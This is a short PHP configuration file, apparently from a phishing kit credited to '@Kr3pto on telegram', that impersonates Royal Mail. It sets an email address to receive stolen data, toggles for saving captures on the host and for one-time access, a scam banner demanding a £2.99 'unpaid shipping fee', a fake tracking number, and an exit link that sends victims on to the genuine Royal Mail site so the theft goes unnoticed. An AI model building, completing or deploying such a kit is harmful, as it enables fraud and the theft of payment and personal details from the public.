<?php
// @Kr3pto on telegram
$to = "email@email.com"; // your email here
$saveonhost = 0; //1 for enable and 0 for disable
$One_Time_Access = 0; //1 for enable and 0 for disable

$text_on_top = 'Royal Mail: Your Package Has A £2.99 Unpaid Shipping Fee, To Pay This Now Please Visit www.website.com If You Do Not Pay This Your Package Will Be Returned To Sender'; 

$parcel_tracking = 'EA1610330223UK';

$ExitLink = 'https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwidmKmR2ZLuAhWR3YUKHZ9tAPcQFjAAegQIARAD&url=https%3A%2F%2Fwww.royalmail.com%2F&usg=AOvVaw1xa_PgJojwcTQDIyhWncrk';
?>